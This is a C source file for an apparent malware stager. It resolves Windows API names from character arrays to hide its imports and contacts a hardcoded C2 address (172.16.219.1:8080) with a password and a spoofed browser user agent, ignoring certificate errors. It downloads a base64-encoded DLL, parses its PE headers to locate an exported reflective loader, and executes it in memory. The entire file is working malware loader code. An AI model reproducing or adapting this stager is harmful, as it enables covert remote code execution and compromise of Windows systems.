#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "addresshunter.h"

// crypt32
typedef BOOL(WINAPI* myCryptStringToBinaryA)(LPCSTR pszString, DWORD  cchString,DWORD  dwFlags,BYTE   *pbBinary,DWORD  *pcbBinary,DWORD  *pdwSkip,DWORD  *pdwFlags);

// wininet
typedef HINTERNET(WINAPI* myInternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET(WINAPI* myInternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
typedef HINTERNET(WINAPI* myHttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(WINAPI* myInternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL(WINAPI* myHttpAddRequestHeadersA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
typedef BOOL(WINAPI* myHttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
typedef BOOL(WINAPI* myInternetQueryDataAvailable)(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(WINAPI* myInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(WINAPI* myInternetCloseHandle)(HINTERNET hInternet);

// kernel32
typedef HMODULE(WINAPI* myLoadLibraryA)(LPCSTR lpcBuffer);
typedef LPVOID(WINAPI* myVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef WINBOOL(WINAPI* myVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

// msvcrt.dll
typedef void *__cdecl(WINAPI* mycalloc)(size_t _NumOfElements,size_t _SizeOfElements);
typedef void __cdecl(WINAPI* myfree)(void *_Memory);
typedef void *__cdecl(WINAPI* myrealloc)(void *_Memory,size_t _NewSize);
typedef errno_t(WINAPI* mymemcpy_s)(void * __dst, size_t __os, const void * __src, size_t __n);

// UINT64 hkernel32;
// UINT64 hmsvcrt;
// myfree freeFunc;
// myLoadLibraryA LoadLibraryAFunc;
// mymemcpy_s memcpy_sFunc;
//-----------------------

void * mymemset(void *dest, int val, size_t len) {
    unsigned char *ptr = dest;
    while (len-- > 0) {
        *ptr++ = val;
    }
    return dest;
}

DWORD findExportDirectoryInfo(unsigned char* rdll, DWORD pointerToRawData, DWORD virtualAddressOffset) {
    DWORD exportAddressTableRVAOffset = pointerToRawData + 0x4 + 0x4 + 0x2 + 0x2 + 0x4 + 0x4 + 0x4 + 0x4;
    DWORD edataVirtualAddress = (rdll[virtualAddressOffset+3] << 24) | (rdll[virtualAddressOffset+2] << 16) | (rdll[virtualAddressOffset+1] << 8) | rdll[virtualAddressOffset];
    DWORD exportAddressTableRVA = (rdll[exportAddressTableRVAOffset+3] << 24) | (rdll[exportAddressTableRVAOffset+2] << 16) | (rdll[exportAddressTableRVAOffset+1] << 8) | rdll[exportAddressTableRVAOffset];
    DWORD symbolRVAOffset = ( exportAddressTableRVA - edataVirtualAddress ) + pointerToRawData;
    DWORD symbolRVA = (rdll[symbolRVAOffset+3] << 24) | (rdll[symbolRVAOffset+2] << 16) | (rdll[symbolRVAOffset+1] << 8) | rdll[symbolRVAOffset];
    return symbolRVA;
}

void findSectionHeaders(UINT64 hmsvcrt, unsigned char* rdll, int rdll_len, DWORD firstSectionHeaderOffset, DWORD noOfSections) {
    DWORD nextSectionHeaderOffset = firstSectionHeaderOffset;
    for (int i = 0; i < noOfSections; i++) {
        CHAR headerName[] = { rdll[nextSectionHeaderOffset], rdll[nextSectionHeaderOffset+1], rdll[nextSectionHeaderOffset+2], 
        rdll[nextSectionHeaderOffset+3], rdll[nextSectionHeaderOffset+4], rdll[nextSectionHeaderOffset+5], 
        rdll[nextSectionHeaderOffset+6], rdll[firstSectionHeaderOffset+7], 0x00 };
        DWORD virtualSizeOffset = nextSectionHeaderOffset + 0x8;
        DWORD virtualAddressOffset = virtualSizeOffset + 0x4;
        DWORD sizeOfRawDataOffset = virtualAddressOffset + 0x4;
        DWORD pointerToRawDataOffset = sizeOfRawDataOffset + 0x4;

        CHAR edataSec[] = {'.', 'e', 'd', 'a', 't', 'a', 0};
        if (my_strcmp(headerName, edataSec) == 0) {
            DWORD firstByte = rdll[pointerToRawDataOffset+3];
            DWORD secondByte = rdll[pointerToRawDataOffset+2];
            DWORD thirdByte = rdll[pointerToRawDataOffset+1];
            DWORD fourthByte = rdll[pointerToRawDataOffset+0];

            DWORD pointerToRawData = ( firstByte << 24 ) | ( secondByte << 16 ) | ( thirdByte << 8 ) | fourthByte;
            DWORD symbolRVA = findExportDirectoryInfo(rdll, pointerToRawData, virtualAddressOffset);

            DWORD tempSectionHeaderOffset = firstSectionHeaderOffset;
            for (int i = 0; i < 11; i++) {
                // VirtualAddress offset is 12 bytes from firstSectionHeaderOffset ( Name = 8 bytes, VirtualSize = 4 bytes )
                DWORD sectionVirtualAddressOffset = firstSectionHeaderOffset + 0xC;
                DWORD sectionVirtualAddress = (rdll[sectionVirtualAddressOffset+3] << 24) | (rdll[sectionVirtualAddressOffset+2] << 16) | (rdll[sectionVirtualAddressOffset+1] << 8) | rdll[sectionVirtualAddressOffset];
                // SizeOfRawData offset is 4 bytes from VirtualAddress ( VirtualAddress = 4 )
                DWORD sectionSizeOfRawDataOffset = sectionVirtualAddressOffset + 0x4;
                DWORD sectionSizeOfRawData = (rdll[sectionSizeOfRawDataOffset+3] << 24) | (rdll[sectionSizeOfRawDataOffset+2] << 16) | (rdll[sectionSizeOfRawDataOffset+1] << 8) | rdll[sectionSizeOfRawDataOffset];
                // SizeOfRawData offset is 4 bytes from SizeOfRawData ( SizeOfRawData = 4 )
                DWORD sectionPointerToRawDataOffset = sectionSizeOfRawDataOffset + 0x4;
                DWORD sectionPointerToRawData = (rdll[sectionPointerToRawDataOffset+3] << 24) | (rdll[sectionPointerToRawDataOffset+2] << 16) | (rdll[sectionPointerToRawDataOffset+1] << 8) | rdll[sectionPointerToRawDataOffset];

                if  (symbolRVA > sectionVirtualAddress && (symbolRVA < sectionVirtualAddress + sectionSizeOfRawData) ) {
                    DWORD symbolFileOffset = ( symbolRVA - sectionVirtualAddress ) + sectionPointerToRawData;

                    UINT64 hkernel32 = GetKernel32();
                    CHAR VirtualAlloc_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0};
                    myVirtualAlloc VirtualAllocFunc = (myVirtualAlloc)GetSymbolAddress((HANDLE)hkernel32, VirtualAlloc_c);

                    CHAR VirtualProtect_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};
                    myVirtualProtect VirtualProtectFunc = (myVirtualProtect)GetSymbolAddress((HANDLE)hkernel32, VirtualProtect_c);

                    CHAR memcpy_s_c[] = { 'm', 'e', 'm', 'c', 'p', 'y', '_', 's', 0 };
                    mymemcpy_s memcpy_sFunc = (mymemcpy_s)GetSymbolAddress((HANDLE)hmsvcrt, memcpy_s_c);

                    unsigned char* boxreflectDllExectuableBuffer = (unsigned char*) VirtualAllocFunc(NULL, rdll_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
                    memcpy_sFunc(boxreflectDllExectuableBuffer, rdll_len, rdll, rdll_len);
                    // for (int i = 0; i< 0x80; i++) {
                    //     if (i == 0x3c) {
                    //         i+=4;
                    //     }
                    //     boxreflectDllExectuableBuffer[i] = 0;
                    // }

                    DWORD flOldProtect;
                    VirtualProtectFunc(boxreflectDllExectuableBuffer, rdll_len, PAGE_EXECUTE_READ, &flOldProtect);

                    LPTHREAD_START_ROUTINE symbolExecutableAddress = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)boxreflectDllExectuableBuffer + symbolFileOffset );
                    ((void(*)()) (symbolExecutableAddress))();
                    break;
                }
                tempSectionHeaderOffset += 0x28;
            }
        }
        nextSectionHeaderOffset += 0x28;
    }
}

// decode base64
INT decodeBase64(UINT64 hmsvcrt, myLoadLibraryA LoadLibraryAFunc, myfree freeFunc, CHAR* encodedText, CHAR** clearText) {
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', 0 };
    UINT64 hcrypt32 = (UINT64) ((myLoadLibraryA)LoadLibraryAFunc)(crypt32_c);

    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    myCryptStringToBinaryA CryptStringToBinaryAFunc = (myCryptStringToBinaryA)GetSymbolAddress((HANDLE)hcrypt32, CryptStringToBinaryA_c);

    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    mycalloc callocFunc = (mycalloc)GetSymbolAddress((HANDLE)hmsvcrt, calloc_c);

    DWORD clearTextLength;
    CryptStringToBinaryAFunc(encodedText, 0, CRYPT_STRING_BASE64, NULL, &clearTextLength, NULL, NULL);
    *clearText = (CHAR*)callocFunc(clearTextLength+1, sizeof(CHAR));
    if (*clearText) {
        if (CryptStringToBinaryAFunc(encodedText, 0, CRYPT_STRING_BASE64, (PBYTE)(*clearText), &clearTextLength, NULL, NULL)) {
            return clearTextLength;
        } else {
            freeFunc(*clearText);
            *clearText = NULL;
            return 0;
        }
    } else {
        return ERROR_INSUFFICIENT_BUFFER;
    }
}

BOOL stager(UINT64 hmsvcrt, myLoadLibraryA LoadLibraryAFunc, myfree freeFunc, CHAR *rdll_encoded) {
    unsigned char *rdll_decoded = NULL;
    INT rdll_len = decodeBase64(hmsvcrt, LoadLibraryAFunc, freeFunc, rdll_encoded, (CHAR**) &rdll_decoded);

    if (rdll_len > 0) {
        DWORD peHeaderOffset = (rdll_decoded[0x3c+2] << 16) | (rdll_decoded[0x3c+1] << 8) | rdll_decoded[0x3c];
        DWORD noOfSectionsOffset = peHeaderOffset + 4 + 0x2;
        DWORD noOfSections = ( rdll_decoded[noOfSectionsOffset+1] << 8 ) | ( rdll_decoded[noOfSectionsOffset] );
        DWORD sizeOfOptionalHeaderOffset = noOfSectionsOffset + 0x2 + 0x4 + 0x4 + 0x4;
        DWORD sizeOfOptionalHeader = ( rdll_decoded[sizeOfOptionalHeaderOffset+1]<<8) | (rdll_decoded[sizeOfOptionalHeaderOffset]);
        DWORD firstSectionHeaderOffset = sizeOfOptionalHeaderOffset + 0x2 + 0x2 + sizeOfOptionalHeader;
        findSectionHeaders(hmsvcrt, rdll_decoded, rdll_len, firstSectionHeaderOffset, noOfSections);
    }
    freeFunc(rdll_decoded);
    return FALSE;
}

void stager_main() {
    UINT64 hkernel32 = GetKernel32();
    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
    myLoadLibraryA LoadLibraryAFunc = (myLoadLibraryA)GetSymbolAddress((HANDLE)hkernel32, loadlibrarya_c);

    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    UINT64 hmsvcrt = (UINT64) ((myLoadLibraryA)LoadLibraryAFunc)(msvcrt_c);
    CHAR realloc_c[] = { 'r', 'e', 'a', 'l', 'l', 'o', 'c', 0 };
    myrealloc reallocFunc = (myrealloc)GetSymbolAddress((HANDLE)hmsvcrt, realloc_c);
    CHAR memcpy_s_c[] = { 'm', 'e', 'm', 'c', 'p', 'y', '_', 's', 0 };
    mymemcpy_s memcpy_sFunc = (mymemcpy_s)GetSymbolAddress((HANDLE)hmsvcrt, memcpy_s_c);
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    myfree freeFunc = (myfree)GetSymbolAddress((HANDLE)hmsvcrt, free_c);

    CHAR wininet_c[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', 0 };
    UINT64 hwininet = (UINT64) ((myLoadLibraryA)LoadLibraryAFunc)(wininet_c);
    CHAR InternetOpenA_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', 0 };
    myInternetOpenA InternetOpenAFunc = (myInternetOpenA)GetSymbolAddress((HANDLE)hwininet, InternetOpenA_c);

    CHAR InternetConnectA_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'o', 'n', 'n', 'e', 'c', 't', 'A', 0 };
    myInternetConnectA InternetConnectAFunc = (myInternetConnectA)GetSymbolAddress((HANDLE)hwininet, InternetConnectA_c);

    CHAR HttpOpenRequestA_c[] = { 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0 };
    myHttpOpenRequestA HttpOpenRequestAFunc = (myHttpOpenRequestA)GetSymbolAddress((HANDLE)hwininet, HttpOpenRequestA_c);

    CHAR InternetSetOptionA_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 'A', 0 };
    myInternetSetOptionA InternetSetOptionAFunc = (myInternetSetOptionA)GetSymbolAddress((HANDLE)hwininet, InternetSetOptionA_c);

    CHAR HttpAddRequestHeadersA_c[] = { 'H', 't', 't', 'p', 'A', 'd', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'H', 'e', 'a', 'd', 'e', 'r', 's', 'A', 0 };
    myHttpAddRequestHeadersA HttpAddRequestHeadersAFunc = (myHttpAddRequestHeadersA)GetSymbolAddress((HANDLE)hwininet, HttpAddRequestHeadersA_c);

    CHAR HttpSendRequestA_c[] = { 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0 };
    myHttpSendRequestA HttpSendRequestAFunc = (myHttpSendRequestA)GetSymbolAddress((HANDLE)hwininet, HttpSendRequestA_c);

    CHAR InternetQueryDataAvailable_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    myInternetQueryDataAvailable InternetQueryDataAvailableFunc = (myInternetQueryDataAvailable)GetSymbolAddress((HANDLE)hwininet, InternetQueryDataAvailable_c);

    CHAR InternetReadFile_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0 };
    myInternetReadFile InternetReadFileFunc = (myInternetReadFile)GetSymbolAddress((HANDLE)hwininet, InternetReadFile_c);

    CHAR InternetCloseHandle_c[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    myInternetCloseHandle InternetCloseHandleFunc = (myInternetCloseHandle)GetSymbolAddress((HANDLE)hwininet, InternetCloseHandle_c);

    CHAR *rdll_buffer = NULL;
    HINTERNET b_Internet = NULL, b_HttpSession = NULL, b_HttpRequest = NULL;
    DWORD SecFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

    // length of initial request = length of c2Auth(8) + crlf(4) + null byte
    CHAR postBuffer[] = { 'P', '@', '$', '$', 'W', '0', 'R', 'D', '\r', '\n', '\r', '\n', 0 };
    CHAR contentLength[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'L', 'e', 'n', 'g', 't', 'h', ':', ' ', '1', '3', '\r', '\n', 0 };
    CHAR useragent[] = { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0',
     '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0',
     ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ';', ' ', 'r', 'v', ':', '8', '7', '.', '0', ')',
     ' ', 'G', 'e', 'c', 'k', 'o', '/', '2', '0', '1', '0', '0', '1', '0', '1', ' ', 'F', 'i', 'r', 'e', 'f', 'o', 'x', '/', '8', '7', '.', '0', 0 };
    CHAR remotehost[] = {'1', '7', '2', '.', '1', '6', '.', '2', '1', '9', '.', '1', 0};
    CHAR request[] = {'P', 'O', 'S', 'T', 0};
    CHAR uri[] = {'/', 'i', 'n', 'd', 'e', 'x', '.', 'h', 't', 'm', 'l', 0};

    b_Internet = InternetOpenAFunc(useragent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    b_HttpSession = InternetConnectAFunc(b_Internet, remotehost, 8080, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
    b_HttpRequest = HttpOpenRequestAFunc(b_HttpSession, request, uri, 0, 0, 0, INTERNET_FLAG_NO_COOKIES, 0);

    if (InternetSetOptionAFunc(b_HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &SecFlag, sizeof(SecFlag))) {
        if (HttpAddRequestHeadersAFunc(b_HttpRequest, contentLength, -1, HTTP_ADDREQ_FLAG_ADD)) {
            if (HttpSendRequestAFunc(b_HttpRequest, 0, 0, postBuffer, 13)) {
                CHAR *tempbuff = NULL;
                tempbuff = (CHAR*)reallocFunc(tempbuff, 8192+1);
                DWORD fullBufferLength = 0, copiedoffset = 0;
                while (TRUE) {
                    DWORD availableSize = 0, buff_downloaded;
                    BOOL checkVal = InternetQueryDataAvailableFunc(b_HttpRequest, &availableSize, 0, 0);
                    if (!checkVal || availableSize == 0)  {
                        break;
                    }
                    checkVal = InternetReadFileFunc(b_HttpRequest, tempbuff, availableSize, &buff_downloaded);
                    if (!checkVal || buff_downloaded == 0) {
                        break;
                    }
                    fullBufferLength += buff_downloaded;
                    rdll_buffer = (CHAR*)reallocFunc(rdll_buffer, fullBufferLength+1);
                    memcpy_sFunc(rdll_buffer+copiedoffset, fullBufferLength, tempbuff, buff_downloaded);
                    mymemset(tempbuff, 0, 8192+1);
                    copiedoffset += buff_downloaded;
                }
            }
        }
    }
    if (rdll_buffer) {
        stager(hmsvcrt, LoadLibraryAFunc, freeFunc, rdll_buffer);
    }

    if (b_HttpRequest) {
        InternetCloseHandleFunc(b_HttpRequest);
    }
    if (b_HttpSession) {
        InternetCloseHandleFunc(b_HttpSession);
    }
    if (b_Internet) {
        InternetCloseHandleFunc(b_Internet);
    }
    freeFunc(rdll_buffer);
}

// int main() {
//     stager_main();
//     return 0;
// }